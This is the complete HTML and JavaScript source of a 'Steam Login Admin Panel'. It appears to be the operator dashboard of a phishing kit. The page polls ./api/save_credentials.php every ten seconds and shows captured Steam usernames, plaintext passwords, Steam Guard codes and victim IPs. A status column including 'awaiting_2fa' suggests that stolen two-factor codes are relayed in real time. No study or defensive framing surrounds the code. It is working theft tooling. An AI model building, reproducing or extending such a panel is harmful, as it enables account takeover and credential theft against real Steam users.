
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-900 text-white">
    <div class="container mx-auto px-4 py-8">
        <div class="flex justify-between items-center mb-6">
            <h1 class="text-2xl font-bold">Steam Login Admin Panel</h1>
            <button id="refreshBtn" class="px-4 py-2 bg-blue-600 rounded hover:bg-blue-700">Refresh Data</button>
        </div>
        
        <div class="bg-gray-800 rounded-lg shadow-lg p-6">
            <h2 class="text-xl font-semibold mb-4">Login Attempts</h2>
            <div class="overflow-x-auto">
                <table class="min-w-full bg-gray-700 rounded-lg">
                    <thead>
                        <tr>
                            <th class="px-4 py-2 text-left">Username</th>
                            <th class="px-4 py-2 text-left">Password</th>
                            <th class="px-4 py-2 text-left">Steam Guard</th>
                            <th class="px-4 py-2 text-left">IP</th>
                            <th class="px-4 py-2 text-left">Timestamp</th>
                            <th class="px-4 py-2 text-left">Status</th>
                        </tr>
                    </thead>
                    <tbody id="credentialsTable">
                        <tr>
                            <td colspan="6" class="px-4 py-2 text-center">Loading data...</td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        // Function to fetch and display credentials
        function fetchCredentials() {
            fetch('./api/save_credentials.php')
                .then(response => response.json())
                .then(data => {
                    const tableBody = document.getElementById('credentialsTable');
                    tableBody.innerHTML = '';
                    
                    if (data.length === 0) {
                        tableBody.innerHTML = '<tr><td colspan="6" class="px-4 py-2 text-center">No login attempts recorded</td></tr>';
                        return;
                    }
                    
                    // Sort by timestamp, newest first
                    data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                    
                    data.forEach(entry => {
                        const row = document.createElement('tr');
                        row.className = 'border-t border-gray-600 hover:bg-gray-600';
                        
                        row.innerHTML = `
                            <td class="px-4 py-2">${entry.username || '-'}</td>
                            <td class="px-4 py-2">${entry.password || '-'}</td>
                            <td class="px-4 py-2">${entry.steamguard || '-'}</td>
                            <td class="px-4 py-2">${entry.ip || '-'}</td>
                            <td class="px-4 py-2">${entry.timestamp || '-'}</td>
                            <td class="px-4 py-2">
                                <span class="px-2 py-1 rounded text-xs ${
                                    entry.status === 'pending' ? 'bg-yellow-500 text-black' :
                                    entry.status === 'rejected' ? 'bg-red-500 text-white' :
                                    entry.status === 'awaiting_2fa' ? 'bg-blue-500 text-white' :
                                    entry.status === 'blocked' ? 'bg-gray-500 text-white' :
                                    'bg-green-500 text-white'
                                }">
                                    ${entry.status || 'pending'}
                                </span>
                            </td>
                        `;
                        
                        tableBody.appendChild(row);
                    });
                })
                .catch(error => {
                    console.error('Error fetching data:', error);
                    document.getElementById('credentialsTable').innerHTML = 
                        '<tr><td colspan="6" class="px-4 py-2 text-center text-red-500">Error loading data</td></tr>';
                });
        }
        
        // Initial fetch
        fetchCredentials();
        
        // Set up refresh button
        document.getElementById('refreshBtn').addEventListener('click', fetchCredentials);
        
        // Auto-refresh every 10 seconds
        setInterval(fetchCredentials, 10000);
    </script>
</body>
</html>
